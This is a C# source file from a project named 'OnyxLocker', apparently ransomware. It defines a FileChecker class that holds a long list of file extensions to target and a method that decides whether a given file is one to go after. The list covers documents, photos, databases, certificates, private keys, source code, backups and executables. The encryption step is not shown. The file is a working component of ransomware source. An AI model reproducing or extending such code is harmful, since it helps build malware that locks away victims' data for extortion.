using System.IO;
using System.Linq;

namespace OnyxLocker
{
    internal class FileChecker : IFileChecker
    {
        public string[] TargetFiles { get; } =
        {
            ".pdf", ".zip", ".ppt", ".doc", ".docx", ".rtf", ".jpg", ".jpeg", ".png", ".img", ".gif", ".mp3",
            ".mp4", ".mpeg",".mov", ".avi", ".wmv",".txt", ".html", ".php", ".js", ".css", ".odt", ".sqlite3", ".ink",
            ".ods", ".odp", ".odm",".odc",".odb", ".docm", ".wps", ".xls", ".xlsx", ".xlsm", ".xlsb", ".xlk",
            ".ppt", ".pptx",".pptm", ".mdb", ".accdb", ".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".wb2", ".mdf",
            ".psd", ".pdd", ".eps", ".ai", ".indd", ".cdr", ".jpe", ".tmp", ".log", ".py", ".dbf", ".ps1",
            ".dng", ".3fr", ".arw", ".srf", ".sr2", ".bay", ".crw", ".cr2", ".dcr", ".rwl", ".rw2", ".pyc",
            ".kdc", ".erf", ".mef", ".mrw", ".nef", ".nrw", ".orf", ".raf", ".raw", ".r3d", ".ptx", ".css",
            ".pef", ".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12", ".p7b", ".p7c", ".sqlite",
            ".js", ".rb", ".xml", ".wmi", ".sh", ".asp", ".aspx", ".plist", ".sql", ".vbs",".litesql", ".dotx",
            ".db3", ".backup", ".xlm", ".rtf", "json", ".lua", ".tiff",".tif", "csproj", ".sln", ".crt", ".csv",
            ".flv", ".vlf",".rar", ".7zip", ".acc", ".lnk",".cs", ".h", ".cpp", ".c", ".sg", "mid", ".wav", ".7z",
            ".exe",".db",
        };

        public bool IsTargetFile(string filePath)
        {
            var fileExtension = Path.GetExtension(filePath).ToLower();
            return TargetFiles.Contains(fileExtension);
        }
    }
}